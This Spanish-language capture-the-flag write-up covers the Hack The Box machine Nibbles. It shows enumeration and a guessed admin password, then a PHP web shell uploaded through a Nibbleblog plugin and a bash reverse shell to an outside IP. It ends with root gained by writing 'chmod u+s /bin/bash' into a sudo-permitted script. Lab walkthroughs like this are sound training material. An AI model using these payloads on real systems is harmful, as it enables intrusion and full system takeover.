---
tags:
title: Nibbles - Easy (HTB)
permalink: /Nibbles-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

Empezamos realizando un escaneo de la red en busca de puertos y servicios

```bash 
nmap -sCV -p22,80 10.129.65.246
```

Al ver que el puerto `80` es el servicio de `HTTP` vamos a ver que tipo de pagina nos encontramos.

![{E6B94D9B-2FAF-4115-A98D-9EE089830B17} 1](images/{E6B94D9B-2FAF-4115-A98D-9EE089830B17} 1.png)

Vemos que el contenido de la pagina es casi nulo pero en el código fuente de la misma encontramos un comentario el cual nos da un dato sobre una ruta de la pagina `nibbleblog`.

```html
<b>Hello world!</b>

[..snip..]

<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

![Pasted image 20250820154441](images/Pasted image 20250820154441.png)

### Gobuster enumeration

```bash
gobuster dir -u http://10.129.249.242/nibbleblog -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x php,txt,asp,aspx -t 200
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.249.242/nibbleblog
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,asp,aspx
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/sitemap.php          (Status: 200) [Size: 402]
/content              (Status: 301) [Size: 329] [--> http://10.129.249.242/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]
/feed.php             (Status: 200) [Size: 302]
/themes               (Status: 301) [Size: 328] [--> http://10.129.249.242/nibbleblog/themes/]
/admin                (Status: 301) [Size: 327] [--> http://10.129.249.242/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
```

Vemos varios archivos y una carpeta content, la cual quizas podria contener archivos visibles en caso de que tengamos capacidad de `Directory listing`.

#### admin.php

Como veo que el contenido de `admin.php` es una pagina de login, paso a la carpeta `content`. Si probamos con credenciales tipicas como `admimn:admin` o `admin:password` no funcionan por lo que me toca enumerar a fondo el sitio web por mas rutas.

![{2262324B-9B00-45EC-9D6F-90F023F48C5B}](images/{2262324B-9B00-45EC-9D6F-90F023F48C5B}.png)

#### content Folder

![{E59CA073-2339-412B-8A57-FE8EC554BE1B}](images/{E59CA073-2339-412B-8A57-FE8EC554BE1B}.png)

Veo varios archivos `.xml`. el contenido del `config.xml` tiene lo siguiente:

```xml
<config>
<name type="string">Nibbles</name>
<slogan type="string">Yum yum</slogan>
<footer type="string">Powered by Nibbleblog</footer>
<advanced_post_options type="integer">0</advanced_post_options>
<url type="string">http://10.10.10.134/nibbleblog/</url>
<path type="string">/nibbleblog/</path>
<items_rss type="integer">4</items_rss>
<items_page type="integer">6</items_page>
<language type="string">en_US</language>
<timezone type="string">UTC</timezone>
<timestamp_format type="string">%d %B, %Y</timestamp_format>
<locale type="string">en_US</locale>
<img_resize type="integer">1</img_resize>
<img_resize_width type="integer">1000</img_resize_width>
<img_resize_height type="integer">600</img_resize_height>
<img_resize_quality type="integer">100</img_resize_quality>
<img_resize_option type="string">auto</img_resize_option>
<img_thumbnail type="integer">1</img_thumbnail>
<img_thumbnail_width type="integer">190</img_thumbnail_width>
<img_thumbnail_height type="integer">190</img_thumbnail_height>
<img_thumbnail_quality type="integer">100</img_thumbnail_quality>
<img_thumbnail_option type="string">landscape</img_thumbnail_option>
<theme type="string">simpler</theme>
<notification_comments type="integer">1</notification_comments>
<notification_session_fail type="integer">0</notification_session_fail>
<notification_session_start type="integer">0</notification_session_start>
<notification_email_to type="string">admin@nibbles.com</notification_email_to>
<notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
<seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
<seo_site_description type="string"/>
<seo_keywords type="string"/>
<seo_robots type="string"/>
<seo_google_code type="string"/>
<seo_bing_code type="string"/>
<seo_author type="string"/>
<friendly_urls type="integer">0</friendly_urls>
<default_homepage type="integer">0</default_homepage>
</config>
```

#### users.xml

Y por otro lado el `users.xml` contiene esto:

```xml
<users>
<user username="admin">
<id type="integer">0</id>
<session_fail_count type="integer">0</session_fail_count>
<session_date type="integer">1514544131</session_date>
</user>
<blacklist type="string" ip="10.10.10.1">
<date type="integer">1512964659</date>
<fail_count type="integer">1</fail_count>
</blacklist>
</users>
```

 Este archivo me revela que `admin` es un usuario valido a nivel de login en la pagina y ademas en el archivo config, vimos que arroba a nibbles, asi que podriamos usar credenciales como `admin:nibbles`, o `admin:nibble`.

![Pasted image 20250820154549](images/Pasted image 20250820154549.png)

Y en este caso las credenciales que funcionaron fueron `admin:nibbles`.
![Pasted image 20250820154602](images/Pasted image 20250820154602.png)

Vemos que corre `nibble` el cual es vulnerable a un subida de archivos debido a la mala sanitización del código, mas precisamente en la sección de `Plugins` así que pasamos a crearnos un archivo al cual lo vamos a llamar `image.php` con este contenido.

```php
<?php
	system($_GET['cmd']);
?>
```

Lo subimos.

![{2F77AB1A-0346-48EA-9478-A47BAF033476}](images/{2F77AB1A-0346-48EA-9478-A47BAF033476}.png)

Y si nos vamos a la ruta `content/private/plugins/my_image/` vemos que ahí ya podemos llamar a nuestro archivo y por el parámetro `cmd` intentar si tenemos ejecución remota de comandos.

```bash
curl -s -X GET 'http://10.129.249.242/nibbleblog/content/private/plugins/my_image/image.php?cmd=whoami'
nibbler
```

Y vemos que con exito lo conseguimos asi que ahora el siguiente paso es enviarnos una `Reverse shell` hacia nuestra maquina.

```bash 
bash -c 'bash -i >& /dev/tcp/10.10.17.19/1337 0>&1'
```

Y vemos desde nuestro listener `nc` que anteriormente configuramos, recibimos nuestra shell como el usuario `nibbler`.

```bash
sudo nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.249.242] 38250
whoami
nibbler
```

```bash
nibbler@Nibbles:/home/nibbler$ cat user.txt 
b7aac9aa87355ec5b918d710d06c4e32
```
## Shell as root 

### Enumeration

Al ver sobre que archivos tenemos privilegios a nivel de `SUDOERS` vemos que lo tenemos en un archivo llamado `monitor.sh`

```bash
nibbler@Nibbles:/home/nibbler$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Pero al tambein en el directorio personal de `nibbler` vemos que hay un `personal.zip` comprimido, asi que lo descomprimimos.

```bash 
nibbler@Nibbles:/home/nibbler$ ls
personal.zip  user.txt
```

Lo `unzipeamos`.

```bash
nibbler@Nibbles:/home/nibbler$ unzip personal.zip 
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
nibbler@Nibbles:/home/nibbler$ tree
.
|-- personal
|   `-- stuff
|       `-- monitor.sh
|-- personal.zip
`-- user.txt

2 directories, 3 files
```

Y vemos que en la ruta `/personal/stuff` esta dentro del `monitor.sh`, donde el mismo tiene permisos de lectura, edición y ejecución, por lo que podríamos insertarle un comando y luego con `sudo` ejecutarlo como `root` para lograr nuestro proposito

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la
total 12
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```

Voy a editarlo con el fin de asignarle el bit `suid` a la `bash` con el comando `chmod u+s`

```bash 
echo 'chmod u+s /bin/bash' > monitor.sh 
```

Compruebo los permisos de la bash.

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
```

Y veo que no tiene el `bit`, asi que ahora ejecutemos el script como `root` para ver si mi plan cobra efecto

```bash 
sudo /home/nibbler/personal/stuff/monitor.sh
```

Y con exito el bit se le asigno, por lo que puedo cambiar mi bash de bajos privilegios (`nibbler`) a una bash como `root`.

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
```

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ bash -p 
bash-4.3# whoami
root
```

```bash
bash-4.3# cat /root/root.txt 
d9197742ea6e15d3801c684f8f3c7f40
```

`~Happy Hacking.`

